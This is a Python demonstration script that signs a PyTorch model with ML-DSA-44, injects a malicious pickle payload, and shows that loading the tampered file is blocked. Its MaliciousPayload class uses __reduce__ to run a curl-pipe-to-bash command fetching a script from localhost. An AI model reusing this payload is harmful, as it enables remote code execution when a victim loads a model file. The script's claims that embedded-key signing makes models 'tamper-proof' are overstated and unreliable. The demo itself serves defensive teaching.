#!/usr/bin/env python3
"""
Self-Verifying Model Defense - Educational Tool
================================================
This script demonstrates how cryptographic signatures protect PyTorch models
from tampering and malicious code injection.

Defense Flow:
    1. Load normal model
    2. Sign with ML-DSA-44 (post-quantum cryptography)
    3. Attempt to inject malicious payload
    4. Try to load tampered model â†’ BLOCKED! ğŸ›¡ï¸

Key Concepts:
    - Digital signatures for model integrity
    - Self-verifying models with embedded signatures
    - Tamper detection and prevention
    - ML-DSA-44 (NIST FIPS 204) post-quantum signature scheme
"""

import torch
import pickle
import os
import time
from self_verifying_secure import create_self_verifying_model, verify_self_verifying_model


# ============================================================================
# Configuration
# ============================================================================

SOURCE_MODEL = 'models/small_model.pt'
DEFENSE_DIR = 'models_defense'
SIGNED_MODEL = 'models_defense/small_signed.pt'
TAMPERED_MODEL = 'models_defense/small_signed_tampered.pt'

SECRET_KEY = 'ml_dsa_secret.key'
PUBLIC_KEY = 'ml_dsa_public.key'


# ============================================================================
# Malicious Payload (for demonstration)
# ============================================================================

class MaliciousPayload:
    """Same payload as in 1_attack.py - for testing defense"""
    def __reduce__(self):
        import os
        return (os.system, ('curl -k -s https://localhost:8888/attack_demo.sh | bash',))


# ============================================================================
# Helper Functions
# ============================================================================

def print_header(title):
    """Print formatted section header"""
    print("\n" + "=" * 80)
    print(f" {title}")
    print("=" * 80)


def print_step(step_num, title):
    """Print step header"""
    print(f"\n{'â”€' * 80}")
    print(f"STEP {step_num}: {title}")
    print('â”€' * 80)


# ============================================================================
# Defense Demonstration
# ============================================================================

def demonstrate_defense():
    """Main defense demonstration"""

    print("=" * 80)
    print(" SELF-VERIFYING MODEL DEFENSE DEMONSTRATION")
    print(" Cryptographic Protection Against Model Tampering")
    print("=" * 80)

    print("\nğŸ¯ OBJECTIVES:")
    print("   1. Create a cryptographically signed model")
    print("   2. Show how signatures prevent tampering")
    print("   3. Demonstrate automatic verification on load")
    print("   4. Block malicious payload injection")

    # Create defense directory
    os.makedirs(DEFENSE_DIR, exist_ok=True)

    # ========================================================================
    # STEP 1: Load Source Model
    # ========================================================================
    print_step(1, "Loading Source Model")

    print(f"\nğŸ“– About the Source Model")
    print("â”€" * 80)
    print(f"   File: {SOURCE_MODEL}")
    print(f"   Type: sentence-transformers/all-MiniLM-L6-v2")
    print(f"   Purpose: Normal, unsigned model (vulnerable to tampering)")

    if not os.path.exists(SOURCE_MODEL):
        print(f"\nâŒ ERROR: Source model not found: {SOURCE_MODEL}")
        print(f"   Please ensure the model exists before running this script.")
        return False

    source_size = os.path.getsize(SOURCE_MODEL)
    print(f"\n   âœ“ Source model found")
    print(f"   âœ“ Size: {source_size / (1024*1024):.2f} MB ({source_size:,} bytes)")

    # ========================================================================
    # STEP 2: Create Self-Verifying Model
    # ========================================================================
    print_step(2, "Creating Self-Verifying Model with ML-DSA-44 Signature")

    print(f"\nğŸ“– ML-DSA-44 (NIST FIPS 204)")
    print("â”€" * 80)
    print("   â€¢ Post-quantum digital signature algorithm")
    print("   â€¢ Based on Module-Lattice-Digital-Signature-Algorithm (ML-DSA)")
    print("   â€¢ Resistant to quantum computer attacks")
    print("   â€¢ Standardized by NIST in FIPS 204 (2024)")
    print()
    print("   Signature Process:")
    print("   1. Hash model data with SHA-256")
    print("   2. Sign hash with ML-DSA-44 secret key")
    print("   3. Embed signature + public key into model")
    print("   4. Model becomes self-verifying!")

    print(f"\nğŸ” Signing Process:")
    print("â”€" * 80)
    print(f"   Input:  {SOURCE_MODEL}")
    print(f"   Output: {SIGNED_MODEL}")
    print(f"   Secret Key: {SECRET_KEY}")
    print(f"   Public Key: {PUBLIC_KEY}")
    print()
    print("   Signing in progress...")

    start_time = time.time()

    result = create_self_verifying_model(
        model_path=SOURCE_MODEL,
        secret_key_path=SECRET_KEY,
        public_key_path=PUBLIC_KEY,
        output_path=SIGNED_MODEL
    )

    elapsed = time.time() - start_time
    signed_size = os.path.getsize(SIGNED_MODEL)
    signature_overhead = signed_size - source_size

    print(f"\n   âœ“ Signing completed in {elapsed * 1000:.2f} ms")
    print(f"\n   ğŸ“Š Signature Details:")
    print("   " + "â”€" * 76)
    print(f"      Hash time:      {result['hash_time'] * 1000:7.2f} ms")
    print(f"      Sign time:      {result['sign_time'] * 1000:7.2f} ms")
    print(f"      Write time:     {result['serialize_time'] + result['save_time']:7.2f} ms")
    print(f"      Total time:     {result['total_time'] * 1000:7.2f} ms")
    print("   " + "â”€" * 76)

    print(f"\n   ğŸ“ File Sizes:")
    print("   " + "â”€" * 76)
    print(f"      Original:   {source_size:>12,} bytes ({source_size / (1024*1024):.2f} MB)")
    print(f"      Signed:     {signed_size:>12,} bytes ({signed_size / (1024*1024):.2f} MB)")
    print(f"      Overhead:   {signature_overhead:>12,} bytes ({signature_overhead / 1024:.2f} KB)")
    print(f"      Overhead %: {(signature_overhead / source_size) * 100:>11.4f}%")
    print("   " + "â”€" * 76)

    print(f"\n   ğŸ’¡ Analysis:")
    print(f"      â€¢ Signature overhead is minimal ({signature_overhead / 1024:.2f} KB)")
    print(f"      â€¢ Includes ML-DSA-44 signature + public key + metadata")
    print(f"      â€¢ Model is now self-verifying and tamper-proof!")

    # ========================================================================
    # STEP 3: Verify Signed Model (Normal Case)
    # ========================================================================
    print_step(3, "Verifying Signed Model (Normal Case)")

    print(f"\nğŸ“– Automatic Verification on Load")
    print("â”€" * 80)
    print("   When loading a self-verifying model:")
    print("   1. torch.load() deserializes the model")
    print("   2. SelfVerifier object's __reduce__() is called")
    print("   3. Signature is verified automatically")
    print("   4. If valid â†’ returns model data")
    print("   5. If invalid â†’ raises ValueError")

    print(f"\nğŸ” Loading signed model: {SIGNED_MODEL}")
    print("   " + "â”€" * 76)

    try:
        verify_start = time.time()
        model = torch.load(SIGNED_MODEL, weights_only=False)
        verify_elapsed = time.time() - verify_start

        print(f"   âœ… VERIFICATION SUCCESSFUL!")
        print(f"   âœ“ Signature is valid")
        print(f"   âœ“ Model integrity confirmed")
        print(f"   âœ“ No tampering detected")
        print(f"   âœ“ Verification time: {verify_elapsed * 1000:.2f} ms")
        print(f"\n   Model type: {type(model)}")

    except ValueError as e:
        print(f"   âŒ VERIFICATION FAILED!")
        print(f"   Error: {str(e)[:100]}")
        return False

    # ========================================================================
    # STEP 4: Attempt to Tamper with Signed Model
    # ========================================================================
    print_step(4, "Attempting to Inject Malicious Payload")

    print(f"\nğŸ“– Attack Scenario: Inject Payload into Signed Model")
    print("â”€" * 80)
    print("   Attacker tries to inject malicious code into the signed model.")
    print("   This simulates a man-in-the-middle attack or compromised download.")

    print(f"\nğŸš¨ Tampering Process:")
    print("   " + "â”€" * 76)
    print("   1. Load signed model (signature valid)")
    print("   2. Extract SelfVerifier object")
    print("   3. Modify model_data_bytes (inject MaliciousPayload)")
    print("   4. Save tampered model (signature now invalid!)")

    # Load the signed model
    print(f"\n   [1/4] Loading signed model...")
    verifier = torch.load(SIGNED_MODEL, weights_only=False)
    print(f"   âœ“ Loaded SelfVerifier object")

    # Extract and modify model data
    print(f"\n   [2/4] Extracting model_data_bytes...")
    original_model = pickle.loads(verifier.model_data_bytes)
    print(f"   âœ“ Deserialized model data")

    print(f"\n   [3/4] Injecting MaliciousPayload...")
    if isinstance(original_model, dict):
        original_model['__malicious_payload__'] = MaliciousPayload()
    else:
        original_model = {
            'original_model': original_model,
            '__malicious_payload__': MaliciousPayload()
        }
    print(f"   âœ“ Payload injected into model")

    # Re-serialize with malicious payload
    verifier.model_data_bytes = pickle.dumps(original_model, protocol=4)
    print(f"   âœ“ Re-serialized with malicious code")

    # Save tampered model (signature is now invalid!)
    print(f"\n   [4/4] Saving tampered model...")
    torch.save(verifier, TAMPERED_MODEL, pickle_protocol=4)

    tampered_size = os.path.getsize(TAMPERED_MODEL)
    tamper_overhead = tampered_size - signed_size

    print(f"   âœ“ Tampered model saved: {TAMPERED_MODEL}")
    print(f"   âœ“ Size: {tampered_size / (1024*1024):.2f} MB ({tampered_size:,} bytes)")
    print(f"   âœ“ Tamper overhead: {tamper_overhead / 1024:.2f} KB ({tamper_overhead:,} bytes)")

    print(f"\n   ğŸ’¡ What Changed?")
    print("   " + "â”€" * 76)
    print("   âœ“ model_data_bytes: MODIFIED (contains malicious payload)")
    print("   âœ— signature:        UNCHANGED (still signs original data)")
    print("   âœ— public_key:       UNCHANGED")
    print()
    print("   Result: Signature verification will FAIL!")

    # ========================================================================
    # STEP 5: Try to Load Tampered Model (Defense Triggered)
    # ========================================================================
    print_step(5, "Attempting to Load Tampered Model")

    print(f"\nğŸ“– Defense Mechanism in Action")
    print("â”€" * 80)
    print("   The tampered model has:")
    print("   â€¢ Modified model_data_bytes (with malicious payload)")
    print("   â€¢ Original signature (doesn't match modified data)")
    print()
    print("   When loaded:")
    print("   1. SelfVerifier's __reduce__() is called")
    print("   2. Computes hash of current model_data_bytes")
    print("   3. Verifies signature against computed hash")
    print("   4. Hashes don't match â†’ SIGNATURE VERIFICATION FAILS")
    print("   5. Raises ValueError â†’ MODEL LOADING BLOCKED!")

    print(f"\nğŸ” Loading tampered model: {TAMPERED_MODEL}")
    print("   " + "â”€" * 76)
    print()

    try:
        print("   EXECUTING: torch.load('{}', weights_only=False)".format(TAMPERED_MODEL))
        print()

        load_start = time.time()
        tampered_model = torch.load(TAMPERED_MODEL, weights_only=False)
        load_elapsed = time.time() - load_start

        # If we reach here, verification failed to block the attack!
        print()
        print("   " + "â”€" * 76)
        print(f"   âŒ DEFENSE FAILED!")
        print(f"   âŒ Tampered model loaded successfully (SHOULD NOT HAPPEN)")
        print(f"   âŒ Malicious payload was NOT blocked!")
        print("   " + "â”€" * 76)
        return False

    except ValueError as e:
        load_elapsed = time.time() - load_start
        error_msg = str(e)

        print()
        print("   " + "â”€" * 76)
        print(f"   âœ… DEFENSE SUCCESSFUL! ğŸ›¡ï¸")
        print("   " + "â”€" * 76)
        print(f"   âœ“ Tampered model BLOCKED!")
        print(f"   âœ“ Signature verification detected tampering")
        print(f"   âœ“ Malicious payload prevented from executing")
        print(f"   âœ“ Detection time: {load_elapsed * 1000:.2f} ms")
        print()
        print(f"   Error Message:")
        print(f"   {error_msg[:200]}")
        if len(error_msg) > 200:
            print(f"   ...")
        print("   " + "â”€" * 76)

    # ========================================================================
    # STEP 6: Comparison with Unsigned Model
    # ========================================================================
    print_step(6, "Comparison: Signed vs Unsigned Models")

    print(f"\nğŸ“Š Attack Success Rate")
    print("â”€" * 80)
    print()
    print("   Unsigned Model (normal PyTorch):")
    print("   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    print("   â€¢ No integrity protection")
    print("   â€¢ torch.load(weights_only=False) executes any code")
    print("   â€¢ Malicious payload: âœ… SUCCEEDS")
    print("   â€¢ Attack prevention: âŒ NONE")
    print()
    print("   Signed Model (Self-Verifying):")
    print("   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    print("   â€¢ Cryptographic signature (ML-DSA-44)")
    print("   â€¢ Automatic verification on load")
    print("   â€¢ Malicious payload: âŒ BLOCKED")
    print("   â€¢ Attack prevention: âœ… COMPLETE")

    print(f"\nğŸ“ˆ Performance Overhead")
    print("â”€" * 80)
    print()
    print(f"   Signature Creation:")
    print(f"   â€¢ Time: {result['total_time'] * 1000:.2f} ms (one-time cost)")
    print(f"   â€¢ Size: {signature_overhead / 1024:.2f} KB overhead")
    print()
    print(f"   Signature Verification:")
    print(f"   â€¢ Time: {verify_elapsed * 1000:.2f} ms (every load)")
    print(f"   â€¢ Overhead: Minimal, adds ~{verify_elapsed * 1000:.0f}ms to load time")

    # ========================================================================
    # Summary
    # ========================================================================
    print_header("SUMMARY - DEFENSE EFFECTIVENESS")

    print(f"""
    ğŸ›¡ï¸ Defense Results
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    âœ… Signed Model Protection:
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    â€¢ Created self-verifying model with ML-DSA-44 signature
    â€¢ Signature overhead: {signature_overhead / 1024:.2f} KB ({(signature_overhead / source_size) * 100:.4f}%)
    â€¢ Signing time: {result['total_time'] * 1000:.2f} ms
    â€¢ Verification time: {verify_elapsed * 1000:.2f} ms

    ğŸš¨ Tampering Attempt:
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    â€¢ Injected MaliciousPayload into signed model
    â€¢ Modified model_data_bytes (signature became invalid)
    â€¢ Attempted to load tampered model

    âœ… Defense Outcome:
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    â€¢ Signature verification DETECTED tampering
    â€¢ Model loading BLOCKED with ValueError
    â€¢ Malicious code PREVENTED from executing
    â€¢ System remains SECURE! ğŸ›¡ï¸

    ğŸ”‘ Key Takeaways:
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    1. Cryptographic Signatures Provide Strong Protection:
       â€¢ ML-DSA-44 post-quantum signature algorithm
       â€¢ Any modification invalidates the signature
       â€¢ Automatic verification on every load

    2. Self-Verifying Models are Tamper-Proof:
       â€¢ Signature and public key embedded in model
       â€¢ No external verification infrastructure needed
       â€¢ Works with standard torch.load()

    3. Minimal Performance Impact:
       â€¢ One-time signing cost: {result['total_time'] * 1000:.2f} ms
       â€¢ Per-load verification: {verify_elapsed * 1000:.2f} ms
       â€¢ Negligible size overhead: {signature_overhead / 1024:.2f} KB

    4. Complete Attack Prevention:
       â€¢ Blocks malicious code injection
       â€¢ Prevents model backdooring
       â€¢ Detects man-in-the-middle attacks
       â€¢ Ensures model authenticity

    5. Comparison with Alternative Defenses:
       â€¢ weights_only=True: Blocks pickle exploits, but breaks many models
       â€¢ File hashing: Requires external hash storage and distribution
       â€¢ Self-verifying: Best of both worlds - secure AND convenient!

    ğŸ“š Next Steps:
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    â€¢ Compare with 1_attack.py (unsigned model attack succeeds)
    â€¢ Compare with 2_victim-load.py (victim loads malicious model)
    â€¢ See test_all_models.py for comprehensive testing
    â€¢ Review self_verifying_secure.py for implementation details
    """)

    print("\n" + "=" * 80)
    print(" Defense Demonstration Complete - Models are Protected! ğŸ›¡ï¸")
    print("=" * 80)
    print()

    return True


# ============================================================================
# Main
# ============================================================================

if __name__ == "__main__":
    success = demonstrate_defense()
    exit(0 if success else 1)
